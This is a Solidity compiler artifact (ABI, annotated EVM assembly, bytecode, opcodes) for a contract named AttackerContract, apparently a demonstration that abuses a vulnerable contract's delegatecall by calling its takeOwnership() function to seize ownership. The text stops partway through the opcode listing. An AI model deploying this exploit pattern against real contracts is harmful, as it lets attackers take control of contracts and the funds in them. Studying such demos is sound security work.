{
	"VulnerableStorageContract.sol": {
		"AttackerContract": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vulnerableContract",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "vulnerableContract",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"details": "Used to exploit the delegatecall VulnerableContract has and use it to take ownership",
				"kind": "dev",
				"methods": {},
				"title": "AttackerContract",
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"VulnerableStorageContract.sol\":968:1554  contract AttackerContract {... */\n  mstore(0x40, 0x80)\n    /* \"VulnerableStorageContract.sol\":1040:1138  constructor(address _vulnerableContract) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"VulnerableStorageContract.sol\":1112:1131  _vulnerableContract */\n  dup1\n    /* \"VulnerableStorageContract.sol\":1091:1109  vulnerableContract */\n  0x00\n  dup1\n    /* \"VulnerableStorageContract.sol\":1091:1131  vulnerableContract = _vulnerableContract */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"VulnerableStorageContract.sol\":1040:1138  constructor(address _vulnerableContract) {... */\n  pop\n    /* \"VulnerableStorageContract.sol\":968:1554  contract AttackerContract {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"VulnerableStorageContract.sol\":968:1554  contract AttackerContract {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"VulnerableStorageContract.sol\":968:1554  contract AttackerContract {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x144166ae\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"VulnerableStorageContract.sol\":1000:1033  address public vulnerableContract */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"VulnerableStorageContract.sol\":1201:1552  function attack() public {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"VulnerableStorageContract.sol\":1000:1033  address public vulnerableContract */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"VulnerableStorageContract.sol\":1201:1552  function attack() public {... */\n    tag_10:\n        /* \"VulnerableStorageContract.sol\":1408:1419  bool result */\n      0x00\n        /* \"VulnerableStorageContract.sol\":1425:1443  vulnerableContract */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"VulnerableStorageContract.sol\":1425:1448  vulnerableContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"VulnerableStorageContract.sol\":1449:1491  abi.encodeWithSignature(\"takeOwnership()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x6053617200000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"VulnerableStorageContract.sol\":1425:1492  vulnerableContract.call(abi.encodeWithSignature(\"takeOwnership()\")) */\n      mload(0x40)\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_16\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_15)\n    tag_16:\n      0x60\n      swap2\n      pop\n    tag_15:\n      pop\n        /* \"VulnerableStorageContract.sol\":1407:1492  (bool result, ) = vulnerableContract.call(abi.encodeWithSignature(\"takeOwnership()\")) */\n      pop\n      swap1\n      pop\n        /* \"VulnerableStorageContract.sol\":1510:1516  result */\n      dup1\n        /* \"VulnerableStorageContract.sol\":1502:1545  require(result, \"Failed to take ownership\") */\n      tag_17\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_17:\n        /* \"VulnerableStorageContract.sol\":1226:1552  {... */\n      pop\n        /* \"VulnerableStorageContract.sol\":1201:1552  function attack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_20:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_21:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_33\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_20\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_22:\n        /* \"#utility.yul\":328:352   */\n      tag_35\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_21\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_8:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_37\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_22\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:691   */\n    tag_23:\n        /* \"#utility.yul\":644:650   */\n      0x00\n        /* \"#utility.yul\":678:683   */\n      dup2\n        /* \"#utility.yul\":672:684   */\n      mload\n        /* \"#utility.yul\":662:684   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:691   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":697:844   */\n    tag_24:\n        /* \"#utility.yul\":798:809   */\n      0x00\n        /* \"#utility.yul\":835:838   */\n      dup2\n        /* \"#utility.yul\":820:838   */\n      swap1\n      pop\n        /* \"#utility.yul\":697:844   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":850:1096   */\n    tag_25:\n        /* \"#utility.yul\":931:932   */\n      0x00\n        /* \"#utility.yul\":941:1054   */\n    tag_41:\n        /* \"#utility.yul\":955:961   */\n      dup4\n        /* \"#utility.yul\":952:953   */\n      dup2\n        /* \"#utility.yul\":949:962   */\n      lt\n        /* \"#utility.yul\":941:1054   */\n      iszero\n      tag_43\n      jumpi\n        /* \"#utility.yul\":1040:1041   */\n      dup1\n        /* \"#utility.yul\":1035:1038   */\n      dup3\n        /* \"#utility.yul\":1031:1042   */\n      add\n        /* \"#utility.yul\":1025:1043   */\n      mload\n        /* \"#utility.yul\":1021:1022   */\n      dup2\n        /* \"#utility.yul\":1016:1019   */\n      dup5\n        /* \"#utility.yul\":1012:1023   */\n      add\n        /* \"#utility.yul\":1005:1044   */\n      mstore\n        /* \"#utility.yul\":977:979   */\n      0x20\n        /* \"#utility.yul\":974:975   */\n      dup2\n        /* \"#utility.yul\":970:980   */\n      add\n        /* \"#utility.yul\":965:980   */\n      swap1\n      pop\n        /* \"#utility.yul\":941:1054   */\n      jump(tag_41)\n    tag_43:\n        /* \"#utility.yul\":1088:1089   */\n      0x00\n        /* \"#utility.yul\":1079:1085   */\n      dup5\n        /* \"#utility.yul\":1074:1077   */\n      dup5\n        /* \"#utility.yul\":1070:1086   */\n      add\n        /* \"#utility.yul\":1063:1090   */\n      mstore\n        /* \"#utility.yul\":912:1096   */\n      pop\n        /* \"#utility.yul\":850:1096   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1102:1488   */\n    tag_26:\n        /* \"#utility.yul\":1206:1209   */\n      0x00\n        /* \"#utility.yul\":1234:1272   */\n      tag_45\n        /* \"#utility.yul\":1266:1271   */\n      dup3\n        /* \"#utility.yul\":1234:1272   */\n      tag_23\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":1288:1376   */\n      tag_46\n        /* \"#utility.yul\":1369:1375   */\n      dup2\n        /* \"#utility.yul\":1364:1367   */\n      dup6\n        /* \"#utility.yul\":1288:1376   */\n      tag_24\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1281:1376   */\n      swap4\n      pop\n        /* \"#utility.yul\":1385:1450   */\n      tag_47\n        /* \"#utility.yul\":1443:1449   */\n      dup2\n        /* \"#utility.yul\":1438:1441   */\n      dup6\n        /* \"#utility.yul\":1431:1435   */\n      0x20\n        /* \"#utility.yul\":1424:1429   */\n      dup7\n        /* \"#utility.yul\":1420:1436   */\n      add\n        /* \"#utility.yul\":1385:1450   */\n      tag_25\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":1475:1481   */\n      dup1\n        /* \"#utility.yul\":1470:1473   */\n      dup5\n        /* \"#utility.yul\":1466:1482   */\n      add\n        /* \"#utility.yul\":1459:1482   */\n      swap2\n      pop\n        /* \"#utility.yul\":1210:1488   */\n      pop\n        /* \"#utility.yul\":1102:1488   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1494:1765   */\n    tag_13:\n        /* \"#utility.yul\":1624:1627   */\n      0x00\n        /* \"#utility.yul\":1646:1739   */\n      tag_49\n        /* \"#utility.yul\":1735:1738   */\n      dup3\n        /* \"#utility.yul\":1726:1732   */\n      dup5\n        /* \"#utility.yul\":1646:1739   */\n      tag_26\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1639:1739   */\n      swap2\n      pop\n        /* \"#utility.yul\":1756:1759   */\n      dup2\n        /* \"#utility.yul\":1749:1759   */\n      swap1\n      pop\n        /* \"#utility.yul\":1494:1765   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1771:1940   */\n    tag_27:\n        /* \"#utility.yul\":1855:1866   */\n      0x00\n        /* \"#utility.yul\":1889:1895   */\n      dup3\n        /* \"#utility.yul\":1884:1887   */\n      dup3\n        /* \"#utility.yul\":1877:1896   */\n      mstore\n        /* \"#utility.yul\":1929:1933   */\n      0x20\n        /* \"#utility.yul\":1924:1927   */\n      dup3\n        /* \"#utility.yul\":1920:1934   */\n      add\n        /* \"#utility.yul\":1905:1934   */\n      swap1\n      pop\n        /* \"#utility.yul\":1771:1940   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1946:2120   */\n    tag_28:\n        /* \"#utility.yul\":2086:2112   */\n      0x4661696c656420746f2074616b65206f776e6572736869700000000000000000\n        /* \"#utility.yul\":2082:2083   */\n      0x00\n        /* \"#utility.yul\":2074:2080   */\n      dup3\n        /* \"#utility.yul\":2070:2084   */\n      add\n        /* \"#utility.yul\":2063:2113   */\n      mstore\n        /* \"#utility.yul\":1946:2120   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2126:2492   */\n    tag_29:\n        /* \"#utility.yul\":2268:2271   */\n      0x00\n        /* \"#utility.yul\":2289:2356   */\n      tag_53\n        /* \"#utility.yul\":2353:2355   */\n      0x18\n        /* \"#utility.yul\":2348:2351   */\n      dup4\n        /* \"#utility.yul\":2289:2356   */\n      tag_27\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":2282:2356   */\n      swap2\n      pop\n        /* \"#utility.yul\":2365:2458   */\n      tag_54\n        /* \"#utility.yul\":2454:2457   */\n      dup3\n        /* \"#utility.yul\":2365:2458   */\n      tag_28\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":2483:2485   */\n      0x20\n        /* \"#utility.yul\":2478:2481   */\n      dup3\n        /* \"#utility.yul\":2474:2486   */\n      add\n        /* \"#utility.yul\":2467:2486   */\n      swap1\n      pop\n        /* \"#utility.yul\":2126:2492   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2498:2917   */\n    tag_19:\n        /* \"#utility.yul\":2664:2668   */\n      0x00\n        /* \"#utility.yul\":2702:2704   */\n      0x20\n        /* \"#utility.yul\":2691:2700   */\n      dup3\n        /* \"#utility.yul\":2687:2705   */\n      add\n        /* \"#utility.yul\":2679:2705   */\n      swap1\n      pop\n        /* \"#utility.yul\":2751:2760   */\n      dup2\n        /* \"#utility.yul\":2745:2749   */\n      dup2\n        /* \"#utility.yul\":2741:2761   */\n      sub\n        /* \"#utility.yul\":2737:2738   */\n      0x00\n        /* \"#utility.yul\":2726:2735   */\n      dup4\n        /* \"#utility.yul\":2722:2739   */\n      add\n        /* \"#utility.yul\":2715:2762   */\n      mstore\n        /* \"#utility.yul\":2779:2910   */\n      tag_56\n        /* \"#utility.yul\":2905:2909   */\n      dup2\n        /* \"#utility.yul\":2779:2910   */\n      tag_29\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":2771:2910   */\n      swap1\n      pop\n        /* \"#utility.yul\":2498:2917   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122054621de4415b8908c37207eac863423922f551e315ebe2da3fbda39a1b605bb064736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50604051610488380380610488833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610371806101176000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063144166ae1461003b5780639e5faafc14610059575b600080fd5b610043610063565b604051610050919061021b565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f60536172000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161015191906102a7565b6000604051808303816000865af19150503d806000811461018e576040519150601f19603f3d011682016040523d82523d6000602084013e610193565b606091505b50509050806101d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ce9061031b565b60405180910390fd5b50565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610205826101da565b9050919050565b610215816101fa565b82525050565b6000602082019050610230600083018461020c565b92915050565b600081519050919050565b600081905092915050565b60005b8381101561026a57808201518184015260208101905061024f565b60008484015250505050565b600061028182610236565b61028b8185610241565b935061029b81856020860161024c565b80840191505092915050565b60006102b38284610276565b915081905092915050565b600082825260208201905092915050565b7f4661696c656420746f2074616b65206f776e6572736869700000000000000000600082015250565b60006103056018836102be565b9150610310826102cf565b602082019050919050565b60006020820190508181036000830152610334816102f8565b905091905056fea264697066735822122054621de4415b8908c37207eac863423922f551e315ebe2da3fbda39a1b605bb064736f6c63430008110033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x488 CODESIZE SUB DUP1 PUSH2 0x488 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xDB JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8 DUP2 PUSH2 0x9D JUMP JUMPDEST DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD5 DUP2 PUSH2 0xAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF1 JUMPI PUSH2 0xF0 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFF DUP5 DUP3 DUP6 ADD PUSH2 0xC6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x371 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x144166AE EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x21B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x6053617200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x151 SWAP2 SWAP1 PUSH2 0x2A7 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x18E JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x193 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1D7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1CE SWAP1 PUSH2 0x31B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x205 DUP3 PUSH2 0x1DA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x215 DUP2 PUSH2 0x1FA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x230 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x20C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x26A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x24F JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x281 DUP3 PUSH2 0x236 JUMP JUMPDEST PUSH2 0x28B DUP2 DUP6 PUSH2 0x241 JUMP JUMPDEST SWAP4 POP PUSH2 0x29B DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x24C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2B3 DUP3 DUP5 PUSH2 0x276 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4661696C656420746F2074616B65206F776E6572736869700000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x305 PUSH1 0x18 DUP4 PUSH2 0x2BE JUMP JUMPDEST SWAP2 POP PUSH2 0x310 DUP3 PUSH2 0x2CF JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x334 DUP2 PUSH2 0x2F8 JUMP 